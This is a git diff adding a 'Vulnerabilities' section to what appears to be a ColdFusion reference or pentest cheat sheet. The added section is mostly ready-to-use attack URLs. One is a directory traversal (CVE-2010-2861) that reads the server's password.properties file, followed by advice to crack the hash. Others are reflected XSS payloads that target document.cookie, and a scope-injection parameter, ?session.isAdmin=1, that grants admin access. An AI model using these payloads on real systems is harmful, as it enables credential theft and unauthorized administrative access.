@@ -441,3 +441,67 @@ mojo = 1; //THIS IS A COMMENT
 	multiple lines
 */
 ```
+
+## Vulnerabilities
+ColdFusion had a lot of security vulnerabilities in the past, so stop using older versions!
+
+##### # Adobe ColdFusion Unspecified Directory Traversal Vulnerability
+detailed information about the exploitation of this vulnerability: http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+1. open file in browser
+```
+http://[server:port]/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+```
+
+<hr>
+
+2. copy the hashed password
+
+```
+#Fri Feb 07 05:48:45 PST 2020 rdspassword= password=42DABCDFADADASASAS4891539FASDA11CA5 encrypted=true
+```
+<hr>
+
+3. compare with rainbow tables
+
+```
+https://www.dcode.fr/sha1-hash
+```
+
+
+##### # Adobe ColdFusion Server Query String Cross-Site Scripting
+detailed information about the exploitation of this vulnerability: https://www.securityfocus.com/bid/36046/info-directory-traversal-faq-cve-2010-2861/
+1. open file in browser
+```
+http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm?component=<body%20onload=alert(document.cookie)>
+```
+
+<hr>
+
+```
+http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=%3Cbody%20onload=alert(document.cookie)%3E
+
+```
+
+<hr>
+
+```
+http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=%3Cbody%20onload=alert(document.cookie)%3E
+```
+
+<hr>
+
+##### # Adobe ColdFusion Server Scope Injection
+detailed information about the exploitation of this vulnerability: https://www.petefreitag.com/item/834.cfm
+
+1. open any action (that checks session.isAdmin) in browser
+```
+http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm
+```
+
+<hr>
+
+2. append the following to the url
+
+```
+?session.isAdmin=1
+```
